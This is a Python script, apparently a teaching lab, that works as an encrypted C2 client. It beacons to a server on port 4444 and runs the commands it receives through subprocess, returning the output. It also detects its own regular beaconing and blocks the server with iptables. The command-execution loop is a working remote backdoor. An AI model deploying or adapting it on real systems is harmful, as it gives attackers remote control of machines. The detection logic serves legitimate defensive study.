import socket
import time
import subprocess
import os
from cryptography.fernet import Fernet

# ========================
# 🔐 CONFIG
# ========================
key = b'N13E54NxFeO9-_Lmv7fKvKLcQdiy6o5EqTpMyTQMb_U='
cipher = Fernet(key)

HOST = "192.168.100.1"
PORT = 4444

# ========================
# 🔌 CONNECT
# ========================
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))
client.settimeout(1)

print("[+] Connected to server")

# ========================
# 📊 DETECTION VARIABLES
# ========================
last_time = None
intervals = []
window_size = 5
alert_triggered = False
blocked = False

# ========================
# 🚫 BLOCK FUNCTION
# ========================
def block_ip(ip):
    print(f"\n🚫 Blocking C2 Server: {ip}\n")

    # Block outgoing traffic
    os.system(f"sudo iptables -A OUTPUT -d {ip} -j DROP")

    # Block incoming traffic
    os.system(f"sudo iptables -A INPUT -s {ip} -j DROP")

# ========================
# 🔁 MAIN LOOP
# ========================
while True:
    try:
        current_time = time.time()

        # ========================
        # 📡 BEACON
        # ========================
        beacon = "HELLO_FROM_CLIENT"
        client.send(cipher.encrypt(beacon.encode()))

        # ========================
        # 📊 DETECTION LOGIC
        # ========================
        if last_time is not None:
            interval = current_time - last_time

            intervals.append(interval)
            if len(intervals) > window_size:
                intervals.pop(0)

            print(f"[DEBUG] Interval: {interval:.2f} sec")

            if len(intervals) == window_size:
                avg = sum(intervals) / len(intervals)

                if all(abs(i - avg) < 0.7 for i in intervals):
                    if not alert_triggered:
                        print("\n⚠️ [ALERT] C2 Beaconing Detected!\n")
                        alert_triggered = True

                        # 🚫 BLOCK + TERMINATE
                        if not blocked:
                            block_ip(HOST)
                            blocked = True

                            client.close()
                            print("[+] Connection terminated after blocking")
                            break
                else:
                    alert_triggered = False

        last_time = current_time

        # ========================
        # 📡 RECEIVE COMMAND
        # ========================
        try:
            data = client.recv(4096)

            if data:
                command = cipher.decrypt(data).decode()
                print("[CMD RECEIVED]:", command)

                if command.lower() == "exit":
                    break

                output = subprocess.getoutput(command)
                client.send(cipher.encrypt(output.encode()))

        except socket.timeout:
            pass

        # ========================
        # ⏱️ FIXED INTERVAL
        # ========================
        time.sleep(5)

    except Exception as e:
        print("[ERROR]:", e)
        break

client.close()
